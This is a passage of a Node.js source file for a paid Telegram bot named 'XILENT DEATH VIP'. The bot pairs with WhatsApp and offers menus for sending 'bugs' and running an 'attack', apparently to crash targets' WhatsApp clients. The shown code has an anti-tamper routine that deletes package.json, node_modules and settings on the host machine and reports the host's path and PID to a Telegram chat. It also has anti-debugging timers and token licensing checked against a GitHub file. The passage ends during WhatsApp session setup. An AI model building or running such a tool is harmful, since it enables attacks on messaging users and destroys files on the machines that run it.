const { Telegraf, Markup} = require("telegraf");
const { spawn } = require('child_process');
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const fs = require('fs');
const path = require('path');
const jid = "0@s.whatsapp.net";
const vm = require('vm');
const os = require('os');
const FormData = require("form-data");
const https = require("https");
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    makeMessagesSocket,
    fetchLatestWaWebVersion,
    interactiveMessage,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    generateMessageID,
    makeCacheableSignalKeyStore,
    generateForwardMessageContent,
    prepareWAMessageMedia,
    MessageRetryMap,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    getAggregateVotesInPollMessage,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    nativeFlowMessage,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    getButtonType,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    WAProto_1,
    baileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    extendedTextMessage,
    relayWAMessage,
    listMessage,
    templateMessage,
  encodeSignedDeviceIdentity,
  encodeWAMessage,
  jidEncode,
  patchMessageBeforeSending,
  encodeNewsletterMessage,
} = require("@bellachu/baileys");
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const { tokenBot, ownerID } = require("./settings/config");
const axios = require('axios');
const moment = require('moment-timezone');
const EventEmitter = require('events')
const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()

  let chats = {}
  let messages = {}
  let contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)

      if (messages[chatId].length > 100) {
        messages[chatId].shift()
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat
    }
  })

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id]
    }
  })

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}

const OWNER = "ponzs212"; 
const REPO = "database";
const TOKEN_FILE = "token.json"; 

const databaseUrl = `https://raw.githubusercontent.com/ponzs212/database/main/token.json`;

  const thumbnailUrl = "https://files.catbox.moe/27wyaz.jpg"; // FOTO PAS Kirim Bug
  
  const StartUrl = "https://files.catbox.moe/4vdyz9.mp4"; // FOTO PAS START
  
  const menuUrl = "https://files.catbox.moe/qrohd1.jpg"; // FOTO MENU
  
  const bugUrl = "https://files.catbox.moe/qrohd1.jpg"; // FOTO MENU BUG
  
  const toolsUrl = "https://files.catbox.moe/qrohd1.jpg"; // FOTO TOOLS
  
  const tqtoUrl = "https://files.catbox.moe/qrohd1.jpg"; // FOTO TQTO
  
  const attackUrl = "https://files.catbox.moe/fl4li0.jpg"; // FOTO PAS BERES BUG

function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(sock, target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(sock, target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}

function enableBypassProtection() {
  const { env, execArgv } = process;

  function deleteFilesOnCrack() {
    const files = [
      "package.json",
      "xilent.js",
      "config.js",
      ".npm",
      "node_modules",
      "settings",
      "XILENT DEATH SCRAPE FILE.zip"
    ];
    for (const file of files) {
      try {
        const targetPath = path.join(process.cwd(), file);
        if (fs.existsSync(targetPath)) {
          fs.unlinkSync(targetPath);
          console.log(`[SECURITY] File dihapus: ${file}`);
        }
      } catch (err) {
        console.error(`[ERROR] Gagal hapus ${file}: ${err.message}`);
      }
    }
  }
  async function reportToTelegram(reason) {
    const text = `🚨 *NGAPAIN KIDS KE DETECTED!*

📂 Path: ${process.cwd()}
🖥️ Node: ${process.version}
PID: ${process.pid}
Reason: ${reason}`;

    try {
      await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        chat_id: REPORT_CHAT_ID,
        text,
        parse_mode: "Markdown"
      });
      console.log("[REPORT] MAKLO SINI GUA BYPASS YATIM😂");
    } catch (err) {
      console.error("[REPORT] EROR BJIR NGAKAK:", err.message);
    }
  }

  const trueAbort = process.abort;
  const trueExit = process.exit;
  const trueToString = Function.prototype.toString.toString();

  Object.defineProperty(process, "abort", { value: trueAbort, configurable: false, writable: false });
  Object.defineProperty(process, "exit", { value: trueExit, configurable: false, writable: false });

  Object.freeze(Function.prototype);
  Object.freeze(axios.interceptors.request);
  Object.freeze(axios.interceptors.response);

  function onCrackDetected(reason) {
    console.error(`[SECURITY] ${reason}`);
    reportToTelegram(reason);
    deleteFilesOnCrack();
    process.kill(process.pid, "SIGKILL");
  }

  if (Function.prototype.toString.toString() !== trueToString) {
    onCrackDetected("Function.prototype.toString dibajak");
  }

  if (execArgv.length === 0 && process.execArgv !== execArgv) {
    onCrackDetected("process.execArgv dipalsukan");
  }

  ["HTTP_PROXY", "HTTPS_PROXY", "NODE_TLS_REJECT_UNAUTHORIZED", "NODE_OPTIONS"].forEach((key) => {
    if (env[key] && env[key] !== "" && env[key] !== "1") {
      onCrackDetected(`ENV ${key} disuntik: ${env[key]}`);
    }
  });

  if (axios.interceptors.request.handlers.length > 0 || axios.interceptors.response.handlers.length > 0) {
    onCrackDetected("Interceptor axios terdeteksi");
  }

  try {
    if (typeof module._load === "function") {
      const moduleCode = module._load.toString();
      if (!moduleCode.includes("tryModuleLoad") && !moduleCode.includes("Module._load")) {
        onCrackDetected("Module._load dibajak");
      }
    }
  } catch (err) {
    onCrackDetected("Gagal akses module._load: " + err.message);
  }

  try {
    const trap = Object.getOwnPropertyDescriptor(require.cache, "get");
    if (typeof trap === "function") {
      onCrackDetected("require.cache diproxy");
    }
  } catch {
    onCrackDetected("require.cache error");
  }

  console.log("\x1b[41m\x1b[37m[🔐 PROTECTION]\x1b[0m BY GAPON ACTIVE 🔥\n");
}

function activateSecureMode() {
  secureMode = true;
}

(function() {
  function randErr() {
    return Array.from({ length: 12 }, () =>
      String.fromCharCode(33 + Math.floor(Math.random() * 90))
    ).join("");
  }

  setInterval(() => {
    const start = performance.now();
    debugger;
    if (performance.now() - start > 100) {
      throw new Error(randErr());
    }
  }, 1000);

  const code = "AlwaysProtect";
  if (code.length !== 13) {
    throw new Error(randErr());
  }

  function secure() {
    console.log(chalk.bold.blue(`
╭─❖──────────────────────────❖─╮
│   XILENT DEATH VIP V1.0 
├───────────────────────────────
│⟢ WAITING...... 
╰─❖──────────────────────────❖─╯
  `))
  }
  
  const hash = Buffer.from(secure.toString()).toString("base64");
  setInterval(() => {
    if (Buffer.from(secure.toString()).toString("base64") !== hash) {
      throw new Error(randErr());
    }
  }, 2000);

  secure();
})();

(() => {
  const hardExit = process.exit.bind(process);
  Object.defineProperty(process, "exit", {
    value: hardExit,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  const hardKill = process.kill.bind(process);
  Object.defineProperty(process, "kill", {
    value: hardKill,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  setInterval(() => {
    try {
      if (process.exit.toString().includes("Proxy") ||
          process.kill.toString().includes("Proxy")) {
        console.log(chalk.bold.red(`
⠀⠀⠀⠀⠀⠀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣴⣿⣿⠿⣟⢷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⣏⡏⠀⠀⠀⢣⢻⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⣟⠧⠤⠤⠔⠋⠀⢿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣿⡆⠀⠀⠀⠀⠀⠸⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠘⣿⡀⢀⣶⠤⠒⠀⢻⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢹⣧⠀⠀⠀⠀⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⡆⠀⠀⠀⠀⠀⠈⢿⣆⣠⣤⣤⣤⣤⣴⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣾⢿⢿⠀⠀⠀⢀⣀⣀⠘⣿⠋⠁⠀⠙⢇⠀⠀⠙⢿⣦⡀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣾⢇⡞⠘⣧⠀⢖⡭⠞⢛⡄⠘⣆⠀⠀⠀⠈⢧⠀⠀⠀⠙⢿⣄⠀⠀⠀⠀
⠀⠀⣠⣿⣛⣥⠤⠤⢿⡄⠀⠀⠈⠉⠀⠀⠹⡄⠀⠀⠀⠈⢧⠀⠀⠀⠈⠻⣦⠀⠀⠀
⠀⣼⡟⡱⠛⠙⠀⠀⠘⢷⡀⠀⠀⠀⠀⠀⠀⠹⡀⠀⠀⠀⠈⣧⠀⠀⠀⠀⠹⣧⡀⠀
⢸⡏⢠⠃⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠘⣧⠀⠀⠀⠀⠸⣷⡀
⠸⣧⠘⡇⠀⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠀⠀⠀⢣⠀⠀⠀⠀⢹⡇⠀⠀⠀⠀⣿⠇
⠀⣿⡄⢳⠀⠀⠀⠀⠀⠀⠀⠈⣷⠀⠀⠀⠀⠀⠀⠈⠆⠀⠀⠀⠀⠀⠀⠀⠀⣼⡟⠀
⠀⢹⡇⠘⣇⠀⠀⠀⠀⠀⠀⠰⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠀⣼⡟⠀⠀
⠀⢸⡇⠀⢹⡆⠀⠀⠀⠀⠀⠀⠙⠁⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⢳⣼⠟⠀⠀⠀
⠀⠸⣧⣀⠀⢳⡀⠀⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⢃⠀⢀⣴⡿⠁⠀⠀⠀⠀
⠀⠀⠈⠙⢷⣄⢳⡀⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠀⠀⣠⡿⠟⠛⠉⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠻⢿⣷⣦⣄⣀⣀⣠⣤⠾⠷⣦⣤⣤⡶⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

⠀⬡═—⊱ BYPASS ALERT⊰—═⬡
┃ NOTE : SERVER MENDETEKSI KAMU
┃  MEMBYPASS PAKSA SCRIPT !
⬡═―—―――――――――――――――――—═⬡
  `))
        activateSecureMode();
        hardExit(1);
      }

      for (const sig of ["SIGINT", "SIGTERM", "SIGHUP"]) {
        if (process.listeners(sig).length > 0) {
          console.log(chalk.bold.blue(`
╭─❖──────────────────────────❖─╮
│   MELACAK KEBERADAAN ANDA.        
├───────────────────────────────
│⟢ Xilent Death Nieh Boss
╰─❖──────────────────────────❖─╯
  `))
        activateSecureMode();
        hardExit(1);
        }
      }
    } catch {
      activateSecureMode();
      hardExit(1);
    }
  }, 2000);

  global.validateToken = async (databaseUrl, tokenBot) => {
  try {
    const res = await axios.get(databaseUrl, { timeout: 5000 });
    const tokens = (res.data && res.data.tokens) || [];

    if (!tokens.includes(tokenBot)) {
      console.log(chalk.bold.blue(`
╭─❖──────────────────────────❖─╮
│   ⚒️  DETECT INFLATOR  ⚒️
├───────────────────────────────
│⟢ 🔴 YOUR TOKEN IS NOT IN THE DATABASE.  
╰─❖──────────────────────────❖─╯
  `));

      try {
      } catch (e) {
      }

      activateSecureMode();
      hardExit(1);
    }
  } catch (err) {
    console.log(chalk.bold.blue(`
╭─❖──────────────────────────❖─╮
│   ACCES ANDA DI TOLAK !!!
├───────────────────────────────
│⟢ MENGHUBUNGI GAPON GANTENG
╰─❖──────────────────────────❖─╯
  `));
    activateSecureMode();
    hardExit(1);
  }
};
})();

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

async function isAuthorizedToken(token) {
    try {
        const res = await axios.get(databaseUrl);
        const authorizedTokens = res.data.tokens;
        return authorizedTokens.includes(token);
    } catch (e) {
        return false;
    }
}

(async () => {
    await validateToken(databaseUrl, tokenBot);
})();

const bot = new Telegraf(tokenBot);
let tokenValidated = false;
bot.use((ctx, next) => {
  if (secureMode) return;
  const text = (ctx.message && ctx.message.text) ? ctx.message.text.trim() : "";
  const cbData = (ctx.callbackQuery && ctx.callbackQuery.data) ? ctx.callbackQuery.data.trim() : "";

  const isStartText = typeof text === "string" && text.toLowerCase().startsWith("/start");
  const isStartCallback = typeof cbData === "string" && cbData === "/start";

  if (!tokenValidated && !(isStartText || isStartCallback)) {
    if (ctx.callbackQuery) {
      try { ctx.answerCbQuery("🔒 ☇ Akses terkunci — validasi token lewat /start "); } catch (e) {}
    }
    return ctx.reply("🔒 ☇ Akses terkunci. Ketik /start  untuk mengaktifkan bot.");
  }
  return next();
});

let secureMode = false;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const premiumFile = './database/premium.json';
const cooldownFile = './database/cooldown.json'

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const savePremiumUsers = (users) => {
    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addPremiumUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumUser(userId);
            return false;
        }
    }
    return false;
};

const loadCooldown = () => {
    try {
        const data = fs.readFileSync(cooldownFile)
        return JSON.parse(data).cooldown || 5
    } catch {
        return 5
    }
}

const saveCooldown = (seconds) => {
    fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2))
}

let cooldown = loadCooldown()
const userCooldowns = new Map()

function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600);
  sec %= 3600;
  let mins = Math.floor(sec / 60);
  sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 1024 / 1024;
  return `${usedMB.toFixed(0)} MB`;
}

const startSesi = async () => {
console.clear();
  console.log(chalk.red(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⢡⡀⢀⣠⣤⠤⠷⠤⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⣄⠀⠀⣀⡴⠟⠉⢠⡀⠠⢤⣄⣠⠀⠉⠻⢦⡀⠀⢀⡴⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠄⠀⠀⠈⢳⡞⠉⠀⠀⠀⣠⡇⢀⠄⠀⢷⡀⠀⠀⠀⠘⣶⡋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣰⡟⠉⠒⠦⣄⣠⡏⠀⠀⠀⠀⢰⣿⢀⣴⣶⣦⡄⣻⠄⢀⢀⣠⣤⢧⣄⣠⠤⠒⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣶⣿⡋⠀⠀⠀⠀⠀⡟⠀⠀⢠⣠⠀⠀⠹⣿⣿⣿⣿⣿⠋⠀⠈⡍⠀⠀⠈⣿⠀⠀⠀⠀⠒⢦⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⡏⠀⠀⠀⣀⣀⣸⠁⠀⠀⣆⠙⣿⣆⢠⣿⣷⣿⣿⣷⠀⣠⣾⣷⡞⠀⠀⢹⣀⣀⣀⣀⠀⢸⣷⣧⣤⣀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠸⡄⠀⢀⡘⢦⣿⣿⣿⣿⣿⣿⣿⣿⣶⣿⣿⣩⠇⡀⠀⢸⠀⠀⠀⠀⠉⢸⣿⣿⣿⣮⡁⡀⠀⠀⠀⠀
⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⢄⡀⠀⠀⠀⢀⣷⡸⣄⣙⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣖⡚⠁⢀⣞⡀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⡴⣔⠀⠀⠀
⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠐⠺⡏⣍⣁⠀⣽⣿⣿⣿⣿⣿⣿⣽⣿⣯⣽⣿⣿⣿⣍⢁⡜⠉⠉⠓⢤⣄⣾⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀
⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠠⣷⣿⣗⡤⠈⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠻⠛⢤⡀⠀⠀⣨⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀
⠀⣿⣿⣿⣿⣿⠿⢿⣿⣿⠿⢿⣿⣿⣿⣿⣷⡀⠈⣿⣿⣄⠀⣿⣿⣿⠁⠹⣿⣿⣿⣿⣿⢿⣿⣗⠀⠀⠀⠉⠂⣠⣿⣿⡿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀
⢀⡿⡿⠉⣿⡟⠀⢸⣿⠏⠀⠀⢹⠿⠿⢿⣿⣷⣄⠚⢿⣿⣿⣿⡿⠃⢈⣹⣿⣿⣿⣿⣿⡎⢿⣿⣇⠀⠀⣶⣴⣿⣿⣿⣿⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄
⢸⣿⣿⣾⣿⡇⠀⢸⠋⠀⠀⠀⠸⠀⠀⠀⠉⠛⣿⣷⣟⣙⠿⣿⡁⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⡿⢿⣿⠟⢿⡏⠀⢸⠉⠁⠀⠈⢹⢿⣿⣿⣿⡇
⢸⣿⣿⣿⣿⡇⠀⠾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⠍⠛⢿⠷⣶⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣿⣆⠀⠁⠀⠀⠀⠀⠈⠀⠀⠀⠀⠞⠀⠘⣿⣿⣟
⢸⣿⣿⣏⣿⡗⠀⠀⠀⠀⠀⠀⣠⠒⠊⠉⠉⠉⢉⣒⠦⣄⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣤⣿⣿⠿⠶⠶⢤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇
⠘⣿⣷⣿⡝⠁⠀⠀⠀⠀⠀⠉⢁⠀⠀⠀⠀⠀⠀⠈⢹⣮⣿⣿⣟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠙⠀⠀⠀⠀⠀⠀⠈⠛⢆⠀⠀⠀⠀⠀⠀⠀⠋⢻⡇
⠀⠻⣿⣤⠁⠀⠀⠀⠀⠀⣤⠈⠋⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⡄⠀⠀⠀⠀⠀⢠⡿⠁
⠀⠀⢻⣧⡀⠀⠀⠀⠀⠀⢸⡀⠀⠀⠀⠀⠀⠀⢀⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡀⠀⠀⠀⠀⣼⠃⠀
⠀⠀⠈⢿⡄⠀⠀⠀⠀⠀⠙⣧⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣧⠀⠀⣀⡼⠁⠀⠀
⠀⠀⠀⠀⠙⢶⡀⠀⠀⠀⠀⢿⣷⠀⠀⢀⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠓⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡟⠀⠀⠛⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠉⠀⠀⠀⠙⠏⠉⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⢿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⣷⣀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣞⣿⣿⣿⣿⣿⣿⣿⣼⣿⣿⣿⡿⣾⢻⣿⣿⡟⢻⣿⣿⣿⣿⣿⣿⠙⠳⢤⣀⣀⣀⣠⡤⠖⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢨⣿⣿⣿⣿⣿⣿⣿⠇⣿⣿⣿⣿⢳⣿⣿⣿⣿⡇⣾⣿⣿⣿⣿⣿⠹⠄⠀⠀⠀⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣟⣿⣿⣿⣿⣻⣿⣾⣿⣿⢸⣿⣿⣿⣿⡇⣿⣿⣿⢹⣿⣿⣇⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣾⣅⡿⣫⠟⣿⣿⡿⢹⡿⠿⣿⣿⣧⢸⣿⣿⣿⣿⠇⣿⣿⠇⡞⣿⡏⠉⢷⠴⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣸⡿⠿⠟⠁⠀⡇⢸⡇⢀⣧⡤⢰⣿⡟⢸⡇⡏⢹⣿⠀⣿⡟⠀⢳⣿⡇⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠞⠁⠀⠀⡠⠀⠀⠁⣿⠃⢸⣿⠙⢺⣻⡗⠸⡇⠡⢸⣿⣰⠈⠀⠀⢘⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠉⢸⠁⠀⠀⠀⣿⠀⠘⣿⡄⠀⠁⠁⠀⠃⠀⠈⣿⠿⠀⠀⠀⠘⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠙⡇⠀⠀⠀⠀⠀⠀⢀⣏⣥⠀⠀⠀⢠⣤⠔⠀⠦⠤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡙⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
`));

  console.log(chalk.green(`
⠀⬡═—⊱ XILENT DEATH ⊰—═⬡
┃ Bot Aktif, Ty Sudah Buy Sc Ini
⬡═―—―――――――――――――――――—═⬡
`));
    
const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'Always Prime',
        }),
    };

    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);
    
